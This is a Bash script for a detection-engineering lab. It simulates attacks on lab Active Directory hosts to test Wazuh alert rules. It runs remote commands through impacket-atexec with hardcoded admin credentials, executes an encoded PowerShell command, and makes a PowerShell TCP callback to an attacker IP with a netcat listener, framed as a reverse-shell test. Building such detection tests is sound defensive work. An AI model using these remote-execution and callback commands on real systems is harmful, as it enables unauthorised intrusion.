#!/bin/bash
# ==============================================================================
# Laboratório de Engenharia de Detecção - Automação de Simulação de Ataques
# Alvos: Active Directory (DC01 / WK01) via Impacket & Netcat
# ==============================================================================

# Configurações do Ambiente
TARGET_IP="10.0.2.15"
KALI_IP="10.0.2.3"
DOMAIN_USER="lab.local/administrator:Lab@2026!Sec"
LISTEN_PORT="4444"

echo "=========================================="
echo " Starting Detection Lab Simulation Tests"
echo "=========================================="

# 1. Simulação: Execution of Encoded PowerShell (T1059.001)
# Dispara comando em Base64 para validar Regra 100030 no Wazuh
echo -e "\n[*] Running Test 1: Encoded PowerShell Execution (Rule 100030)..."
CMD_ENCODED="powershell.exe -e Q2xlYXItSG9zdA=="

impacket-atexec "${DOMAIN_USER}@${TARGET_IP}" "${CMD_ENCODED}"

# 2. Simulação: Reverse Shell / Outbound Connection (T1071 / T1059)
# Requer um listener netcat ativo em paralelo para completar o handshake TCP
echo -e "\n[*] Running Test 2: Network Outbound Connection (Rule 100031 / 91007)..."
echo "[!] Make sure 'nc -lvnp ${LISTEN_PORT}' is running in another terminal!"

CMD_REVERSE="powershell.exe -Command \"\$c = New-Object System.Net.Sockets.TCPClient('${KALI_IP}', ${LISTEN_PORT}); \$c.Close()\""

impacket-atexec "${DOMAIN_USER}@${TARGET_IP}" "${CMD_REVERSE}"

echo -e "\n=========================================="
echo " Simulation Completed. Check Wazuh Dashboard!"
echo "=========================================="
